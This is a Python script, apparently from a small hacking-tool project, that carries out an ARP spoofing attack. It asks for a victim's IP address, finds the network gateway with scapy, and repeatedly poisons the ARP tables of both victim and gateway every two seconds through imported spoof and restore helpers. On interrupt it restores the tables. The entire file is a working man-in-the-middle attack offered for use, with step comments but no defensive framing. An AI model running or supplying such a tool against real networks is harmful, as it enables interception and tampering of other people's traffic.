import time
from helper import *

victim_ip = input("Enter victim's IP address: ")

def spoofing(victim_ip, sleep):
    """
    Performs the ARP spoofing attack
    The function should be executed during the attack,
    otherwise ARP table of the victim will be updated to its 
    correct state.

    Step 1: Spoofing victim
    Step 2: Spoofing gateway
    Note: We maintain the number of packets sent in packets_count
    Step 3: Waiting for 'sleep' seconds before sending next packets

    ARP tables will be restored to their correct state on KeyboardInterrupt

    Step 4: Restoring victim's ARP table
    Step 5: Restoring gateway's ARP table
    """

    packets_count = 0
    victim_gateway = scapy.conf.route.route("0.0.0.0")[2]
    
    try:
        while True:
            # Step 1
            spoof(victim_ip, victim_gateway)

            # Step 2
            spoof(victim_gateway, victim_ip)

            packets_count += 2
            print(f"\rPackets sent: {packets_count}", end="")

            # Step 3
            time.sleep(sleep)
    except KeyboardInterrupt:
        print("\n Reseting ARP tables. Please wait...")
        
        # Step 4
        restore(victim_ip, victim_gateway)

        # Step 5
        restore(victim_gateway, victim_ip)

        print("\n ARP tables restored.")
        
spoofing(victim_ip, 2)